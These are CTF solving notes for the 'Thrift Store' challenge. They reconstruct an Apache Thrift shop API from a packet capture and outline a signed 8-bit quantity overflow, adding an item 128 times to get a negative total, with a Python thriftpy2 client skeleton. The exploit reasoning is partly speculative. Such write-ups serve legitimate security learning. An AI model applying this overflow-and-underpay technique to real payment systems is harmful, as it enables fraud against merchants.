Thrift Store (ImaginaryCTF 2025) – solving notes

What the PCAP shows
- Protocol: Apache Thrift Strict Binary on `127.0.0.1:9090`.
- Methods observed: `getInventory`, `createBasket`, `addToBasket`, `getBasket`, `pay`.
- Types (from dissector):
  - `getInventory() -> list<struct { id:string, name:string, price:i64, opt description:string }>`
  - `createBasket() -> string` (UUID-like id)
  - `addToBasket(basketId:string, itemId:string) -> void`
  - `getBasket(basketId:string) -> list<struct { id:string, quantity:i8 }>`
  - `pay(basketId:string, total:i64) -> void` (throws application exception on mismatch)

Key finding (possible vuln)
- Quantity in `getBasket` is `i8` (signed 8-bit). If the backend multiplies `price * quantity` as signed, you can overflow the quantity by calling `addToBasket` many times (e.g., 128x) and make the effective quantity negative. That can drive the computed total down or negative.
- Frontend likely prevented this, but the backend accepts it (frontend is down per prompt). This is the likely exploitation path to “buy the flag” at a discount or for a negative total.

How to reproduce with tshark
- List calls: `tshark -r capture.pcap -Y thrift`
- Follow a stream: `tshark -r capture.pcap -q -z follow,tcp,ascii,<stream>`
- Inspect fields: `tshark -r capture.pcap -Y "frame.number==<n>" -V`
- Inventory example (prices):
  - apple-red-delicious: 120
  - banana: 90
  - whole-milk-1l: 250
  - brown-eggs-dozen: 450
  - bread-sourdough-loaf: 500
  - carrots-1kg: 300
  - chicken-breast-500g: 750
  - rice-basmati-1kg: 600
  - olive-oil-500ml: 1200
  - cheddar-cheese-200g: 550
  - tomatoes-500g: 280
  - onions-1kg: 250
  - orange-juice-1l: 400
  - potatoes-2kg: 350
  - yogurt-plain-500g: 320

Reconstructed IDL
- See `store.thrift` (built from the PCAP).

Client approach (to solve challenge)
1) Generate a Thrift client from `store.thrift` (or use a dynamic loader like `thriftpy2`).
2) Connect to the challenge backend (host:port provided by the CTF).
3) Call `getInventory()` to confirm item ids and prices.
4) `createBasket()` to get a basket id.
5) Exploit quantity overflow:
   - Repeat `addToBasket(basketId, expensive_item)` 128 times to flip `i8` quantity to -128.
   - Compute the backend’s expected (possibly negative) total from the same rule used in the PCAP (sum of `price * quantity`).
   - Call `pay(basketId, total)` with that exact (negative) total. If accepted, backend may return/enable the flag.
6) If the flag is a hidden product not returned by `getInventory`, try adding likely ids like `flag`, `the-flag`, or read challenge prompt for hints; sometimes the backend allows adding arbitrary ids.

Notes from this PCAP
- Successful `pay` replies are empty structs; mismatches throw an application exception with message “Total does not match basket total”.
- The failing pays in the capture were over by 100; exact totals succeed.

Python skeleton (thriftpy2)
```python
import thriftpy2
from thriftpy2.rpc import make_client

store_thrift = thriftpy2.load("store.thrift", module_name="store_thrift")
cli = make_client(store_thrift.Store, host="<host>", port=9090)

inv = {i.id: i for i in cli.getInventory()}
bid = cli.createBasket()

# Overflow quantity example
item = max(inv.values(), key=lambda x: x.price)  # pick priciest
for _ in range(128):
    cli.addToBasket(bid, item.id)

lines = cli.getBasket(bid)
total = sum(inv[l.id].price * l.quantity for l in lines)
cli.pay(bid, total)  # hope this returns/activates flag
```

If you prefer Apache Thrift (official), generate stubs with `thrift -r --gen py store.thrift` and wire up a TSocket/TBinaryProtocol client instead.

